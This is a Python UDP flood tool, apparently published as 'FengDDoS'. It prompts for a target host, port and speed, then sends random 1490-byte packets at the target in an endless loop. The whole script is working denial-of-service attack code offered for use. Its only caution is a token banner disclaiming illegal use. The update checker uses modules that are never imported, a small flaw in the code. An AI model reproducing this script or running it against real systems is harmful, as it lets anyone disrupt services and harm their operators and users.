# python3
import sys
import os
import time
import socket
import random
from datetime import datetime
from socket import gethostbyname 

class color:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    CYAN = "\033[96m"

LOCAL_VERSION = "1.0.2"
VERSION_URL = "https://raw.githubusercontent.com/FengPwner/FengPYkit/main/version.json"

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes_data = random._urandom(1490)

def check_for_update():
    update_info = {"has_update": False}
    try:
        req = urllib.request.Request(VERSION_URL, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=3) as response:
            if response.status == 200:
                data = json.loads(response.read().decode('utf-8'))
                remote_version = data.get("version", "0.0.0")
                if remote_version > LOCAL_VERSION:
                    update_info["has_update"] = True
                    update_info["remote_version"] = remote_version
                    update_info["download_url"] = data.get("download_url", "")
    except Exception:
        pass
    return update_info

def show_banner():
    os.system("clear")
    os.system("figlet FengDDoS")
    print(f"{color.YELLOW}---------------------------------------------------{color.RESET}")
    print(f"{color.BOLD} Author :{color.RESET} FengPwner")
    print(f"{color.BOLD} Github :{color.RESET} https://github.com/FengPwner")
    print(f"{color.BOLD} Atomgit:{color.RESET} https://atomgit.com/FengPwner")
    print(f"{color.BOLD} CSDN   :{color.RESET} https://blog.csdn.net/2302_76189356")
    print(f"{color.BOLD} Version:{color.RESET} {LOCAL_VERSION}")
    print(f"{color.YELLOW}---------------------------------------------------{color.RESET}")
    print(f"{color.RED}{color.BOLD} [!] Do not use for illegal purposes!{color.RESET}\n")

    update_status = check_for_update()
    if update_status["has_update"]:
        print(f"{color.GREEN}{color.BOLD} [★] New version available: {update_status['remote_version']}!{color.RESET}")
        print(f"{color.GREEN} [★] Download: {update_status['download_url']}{color.RESET}\n")

def handle_error(allow_edit=True):
    while True:
        if allow_edit:
            choice = input(f"{color.YELLOW}[?] Return to menu (y), Exit (n), or Edit (e): {color.RESET}").strip().lower()
            if choice == 'y': return 'y'
            elif choice == 'n':
                print(f"{color.GREEN}[*] Exiting script. Goodbye!{color.RESET}")
                sys.exit(0)
            elif choice == 'e': return 'e'
            else: print(f"{color.RED}[-] Invalid input. Please enter 'y', 'n', or 'e'.{color.RESET}")
        else:
            choice = input(f"{color.YELLOW}[?] Return to menu (y) or Exit (n): {color.RESET}").strip().lower()
            if choice == 'y': return 'y'
            elif choice == 'n':
                print(f"{color.GREEN}[*] Exiting script. Goodbye!{color.RESET}")
                sys.exit(0)
            else: print(f"{color.RED}[-] Invalid input. Please enter 'y' or 'n'.{color.RESET}")

while True:
    show_banner()

    while True:
        target = input(f"{color.BLUE}[1/3] IP or Domain (type 'exit' to quit): {color.RESET}")
        if target.strip().lower() == 'exit':
            print(f"{color.GREEN}[*] Exiting script. Goodbye!{color.RESET}")
            sys.exit(0)
        try:
            ip = gethostbyname(target)
            print(f"{color.GREEN}[+] Resolved target to IP: {ip}{color.RESET}")
            break
        except socket.gaierror:
            print(f"{color.RED}[-] Error: Could not resolve the specified IP or Domain.{color.RESET}")
            action = handle_error(allow_edit=True)
            if action == 'y': break
            elif action == 'e': continue

    if 'ip' not in locals() or target.strip().lower() == 'exit': continue 

    while True:
        port_input = input(f"{color.BLUE}[2/3] Port (1-65535, type 'exit' to quit): {color.RESET}")
        if port_input.strip().lower() == 'exit':
            print(f"{color.GREEN}[*] Exiting script. Goodbye!{color.RESET}")
            sys.exit(0)
        try:
            port = int(port_input)
            if not (1 <= port <= 65535): raise ValueError("Port out of range")
            break
        except ValueError:
            print(f"{color.RED}[-] Error: Invalid port. Please enter a number between 1 and 65535.{color.RESET}")
            action = handle_error(allow_edit=True)
            if action == 'y': break
            elif action == 'e': continue

    if 'port' not in locals(): continue 

    while True:
        sd_input = input(f"{color.BLUE}[3/3] Speed (1~1000, type 'exit' to quit): {color.RESET}")
        if sd_input.strip().lower() == 'exit':
            print(f"{color.GREEN}[*] Exiting script. Goodbye!{color.RESET}")
            sys.exit(0)
        try:
            sd = int(sd_input)
            if not (1 <= sd <= 1000): raise ValueError("Speed out of range")
            break
        except ValueError:
            print(f"{color.RED}[-] Error: Invalid speed. Please enter a number between 1 and 1000.{color.RESET}")
            action = handle_error(allow_edit=True)
            if action == 'y': break
            elif action == 'e': continue

    if 'sd' not in locals(): continue 

    os.system("clear")
    print(f"{color.CYAN}{color.BOLD}[*] Attack started... Press Ctrl+C to stop.{color.RESET}\n")
    sent = 0
    try:
        while True:
            sock.sendto(bytes_data, (ip, port))
            sent += 1
            print(f"{color.GREEN}[+] Sent {sent} data packet to {ip}:{port}{color.RESET}")
            time.sleep((1000 - sd) / 2000)

    except KeyboardInterrupt:
        print(f"\n{color.YELLOW}[!] Attack interrupted by user.{color.RESET}")
        action = handle_error(allow_edit=False)
        if action == 'y': continue
